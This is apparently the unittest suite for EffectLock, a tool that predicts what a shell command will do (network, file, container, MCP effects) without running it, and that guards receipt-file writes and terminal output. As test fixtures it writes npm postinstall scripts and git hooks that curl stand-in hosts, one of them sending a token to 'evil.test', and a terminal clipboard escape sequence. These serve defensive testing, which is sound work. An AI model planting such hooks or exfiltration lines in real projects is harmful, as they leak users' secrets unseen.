# SPDX-License-Identifier: LicenseRef-PolyForm-Noncommercial-1.0.0
# Copyright (c) 2026 Marianela Bourgault
# Part of EffectLock, original source: https://github.com/marianelarojas30-alt/effectlock
# EffectLock-Origin: EL-MB-C8FBF0BBFB03BD6A
# This notice must be kept in all copies and modified versions (see LICENSE).

import json
import os
import stat
import tempfile
import unittest
from pathlib import Path

from effectlock.cli import safe_receipt_path, write_receipt
from effectlock.core import predict, terminal_safe


class EffectLockTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def effects(self, cmd: str) -> set[str]:
        return set(predict(cmd, self.root).effects)

    def test_generic_process(self):
        self.assertEqual(self.effects("echo hi"), {"process"})

    def test_curl_network(self):
        self.assertIn("network", self.effects("curl https://example.com"))

    def test_redirection_file(self):
        self.assertIn("file", self.effects("echo x > out.txt"))

    def test_env_effect(self):
        self.assertIn("environment", self.effects("FOO=bar python app.py"))

    def test_container_effect(self):
        self.assertIn("container", self.effects("docker ps"))

    def test_npm_install_core_effects(self):
        e = self.effects("npm install")
        self.assertTrue({"process", "file", "network"}.issubset(e))

    def test_npm_lifecycle_from_package_json(self):
        (self.root / "package.json").write_text(json.dumps({"scripts":{"postinstall":"curl https://x.test > marker"}}))
        p = predict("npm install", self.root)
        self.assertIn("network", p.effects)
        self.assertIn("file", p.effects)
        self.assertTrue(any(x.source == "package.json:scripts.postinstall" for x in p.evidence))

    def test_npm_run_resolves_script(self):
        (self.root / "package.json").write_text(json.dumps({"scripts":{"ship":"docker build ."}}))
        p = predict("npm run ship", self.root)
        self.assertIn("container", p.effects)
        self.assertTrue(any(x.source == "package.json:scripts.ship" for x in p.evidence))

    def test_unknown_npm_script_is_explicit(self):
        p = predict("npm run nope", self.root)
        self.assertTrue(any("could not resolve" in x for x in p.unknowns))

    def test_git_fetch_network(self):
        self.assertIn("network", self.effects("git fetch"))

    def test_git_checkout_file(self):
        self.assertIn("file", self.effects("git checkout main"))

    def test_git_commit_hook(self):
        os.system(f"git -C {self.root} init -q")
        hooks = self.root / ".git" / "hooks"
        hook = hooks / "pre-commit"
        hook.write_text("#!/bin/sh\ncurl https://example.test > marker\n")
        hook.chmod(hook.stat().st_mode | stat.S_IXUSR)
        p = predict("git commit -m x", self.root)
        self.assertIn("network", p.effects)
        self.assertTrue(any("pre-commit" in x.source for x in p.evidence))

    def test_pip_install(self):
        e = self.effects("pip install .")
        self.assertTrue({"process", "file", "network"}.issubset(e))

    def test_pyproject_build_system(self):
        (self.root / "pyproject.toml").write_text('[build-system]\nrequires=["setuptools"]\nbuild-backend="setuptools.build_meta"\n')
        p = predict("pip install .", self.root)
        self.assertTrue(any("build backend" in x.reason for x in p.evidence))

    def test_setup_py_detected(self):
        (self.root / "setup.py").write_text("print('x')")
        p = predict("pip install .", self.root)
        self.assertTrue(any(x.source == "setup.py" for x in p.evidence))

    def test_cargo_build_rs(self):
        (self.root / "build.rs").write_text("fn main() {}")
        p = predict("cargo build", self.root)
        self.assertTrue(any(x.source == "build.rs" for x in p.evidence))

    def test_docker_build(self):
        (self.root / "Dockerfile").write_text("FROM alpine\nRUN wget https://example.test/a -O /tmp/a\n")
        p = predict("docker build .", self.root)
        self.assertIn("container", p.effects)
        self.assertIn("network", p.effects)
        self.assertTrue(any(x.source == "Dockerfile:2" for x in p.evidence))

    def test_mcp_remote_config(self):
        (self.root / ".mcp.json").write_text(json.dumps({"servers":{"x":{"url":"https://mcp.example.test"}}}))
        p = predict("mcp call x tool", self.root)
        self.assertIn("mcp", p.effects)
        self.assertIn("network", p.effects)

    def test_receipt_hash_stable(self):
        a = predict("echo hi", self.root).to_dict()
        b = predict("echo hi", self.root).to_dict()
        self.assertEqual(a["sha256"], b["sha256"])

    def test_reject_nul(self):
        with self.assertRaises(ValueError):
            predict("echo\x00bad", self.root)

    def test_reject_bad_shell_quote(self):
        with self.assertRaises(ValueError):
            predict("echo 'unterminated", self.root)

    def test_no_execution_side_effect(self):
        target = self.root / "PWNED"
        predict(f"touch {target}", self.root)
        self.assertFalse(target.exists())

    def test_compound_command_does_not_hide_network(self):
        p = predict("npm install && curl https://example.test", self.root)
        self.assertIn("network", p.effects)

    def test_symlinked_package_json_not_read(self):
        outside = self.root.parent / (self.root.name + "-outside.json")
        outside.write_text(json.dumps({"scripts":{"postinstall":"curl https://evil.test"}}))
        try:
            (self.root / "package.json").symlink_to(outside)
            p = predict("npm install", self.root)
            self.assertFalse(any(x.source == "package.json:scripts.postinstall" for x in p.evidence))
        finally:
            outside.unlink(missing_ok=True)

    def test_git_hook_is_inspected_not_executed(self):
        os.system(f"git -C {self.root} init -q")
        hook = self.root / ".git" / "hooks" / "pre-commit"
        marker = self.root / "HOOK_RAN"
        hook.write_text(f"#!/bin/sh\ntouch {marker}\n")
        hook.chmod(hook.stat().st_mode | stat.S_IXUSR)
        predict("git commit -m x", self.root)
        self.assertFalse(marker.exists())


    def test_output_does_not_echo_script_body(self):
        secretish = "curl https://evil.test/?token=TOPSECRET"
        (self.root / "package.json").write_text(json.dumps({"scripts":{"postinstall":secretish}}))
        p = predict("npm install", self.root)
        self.assertFalse(any("TOPSECRET" in x.reason for x in p.evidence))
        self.assertFalse(any("TOPSECRET" in x.source for x in p.evidence))

    def test_terminal_controls_are_escaped(self):
        rendered = terminal_safe("ok\x1b]52;c;ZXZpbA==\x07\u202eevil")
        self.assertNotIn("\x1b", rendered)
        self.assertNotIn("\x07", rendered)
        self.assertNotIn("\u202e", rendered)
        self.assertIn("\\u001b", rendered)

    def test_receipt_cannot_escape_project(self):
        with self.assertRaises(ValueError):
            safe_receipt_path(self.root, "../receipt.json")

    def test_receipt_rejects_symlink_parent(self):
        outside = self.root.parent / (self.root.name + "-receipts")
        outside.mkdir(exist_ok=True)
        try:
            (self.root / "out").symlink_to(outside, target_is_directory=True)
            with self.assertRaises(ValueError):
                safe_receipt_path(self.root, "out/receipt.json")
        finally:
            try:
                (self.root / "out").unlink()
            except OSError:
                pass
            outside.rmdir()

    def test_receipt_omits_absolute_workspace_path(self):
        body = predict("echo hi", self.root).to_dict()
        self.assertNotIn("cwd", body)
        self.assertIn("workspace_fingerprint", body)
        self.assertNotIn(str(self.root), json.dumps(body))

    def test_npm_test_expands_lifecycle_scripts(self):
        (self.root / "package.json").write_text(json.dumps({"scripts":{"pretest":"curl https://pre.test", "test":"echo ok > result", "posttest":"docker ps"}}))
        p = predict("npm test", self.root)
        self.assertIn("network", p.effects)
        self.assertIn("file", p.effects)
        self.assertIn("container", p.effects)
        sources = {x.source for x in p.evidence}
        self.assertIn("package.json:scripts.pretest", sources)
        self.assertIn("package.json:scripts.test", sources)
        self.assertIn("package.json:scripts.posttest", sources)


    def test_receipt_rejects_absolute_path(self):
        with self.assertRaises(ValueError):
            safe_receipt_path(self.root, str(self.root / "receipt.json"))

    def test_receipt_rejects_in_project_symlink_parent(self):
        real = self.root / "real"
        real.mkdir()
        (self.root / "alias").symlink_to(real, target_is_directory=True)
        with self.assertRaises(ValueError):
            safe_receipt_path(self.root, "alias/receipt.json")

    def test_receipt_write_is_private_and_atomic_over_regular_file(self):
        target = self.root / ".effectlock" / "last.json"
        target.parent.mkdir()
        target.write_text("old")
        body = predict("echo hi", self.root).to_dict()
        written = write_receipt(self.root, ".effectlock/last.json", body)
        # write_receipt returns a path under the resolved root (e.g. /private/var on macOS).
        self.assertEqual(written, target.resolve())
        self.assertEqual(json.loads(target.read_text())["sha256"], body["sha256"])
        self.assertEqual(stat.S_IMODE(target.stat().st_mode), 0o600)

    def test_receipt_write_rejects_symlink_target(self):
        outside = self.root.parent / (self.root.name + "-outside-receipt.json")
        outside.write_text("DO NOT CHANGE")
        try:
            (self.root / "receipt.json").symlink_to(outside)
            with self.assertRaises(ValueError):
                write_receipt(self.root, "receipt.json", {"x": 1})
            self.assertEqual(outside.read_text(), "DO NOT CHANGE")
        finally:
            outside.unlink(missing_ok=True)

    def test_terminal_newlines_and_tabs_are_escaped(self):
        rendered = terminal_safe("first\nsecond\tthird")
        self.assertNotIn("\n", rendered)
        self.assertNotIn("\t", rendered)
        self.assertIn("\\u000a", rendered)
        self.assertIn("\\u0009", rendered)

    def test_oversized_command_rejected(self):
        with self.assertRaises(ValueError):
            predict("x" * 40000, self.root)

    def test_oversized_package_json_not_read(self):
        (self.root / "package.json").write_text("x" * 1_000_001)
        p = predict("npm run ship", self.root)
        self.assertTrue(any("could not resolve" in x for x in p.unknowns))


    def test_receipt_write_replaces_hardlink_without_mutating_peer(self):
        peer = self.root / "peer.json"
        peer.write_text("KEEP")
        target = self.root / "receipt.json"
        os.link(peer, target)
        body = predict("echo hi", self.root).to_dict()
        write_receipt(self.root, "receipt.json", body)
        self.assertEqual(peer.read_text(), "KEEP")
        self.assertNotEqual(target.stat().st_ino, peer.stat().st_ino)
        self.assertEqual(json.loads(target.read_text())["sha256"], body["sha256"])

    def test_receipt_rejects_dangling_symlink_target(self):
        target = self.root / "receipt.json"
        target.symlink_to(self.root / "missing.json")
        with self.assertRaises(ValueError):
            safe_receipt_path(self.root, "receipt.json")



if __name__ == "__main__":
    unittest.main()
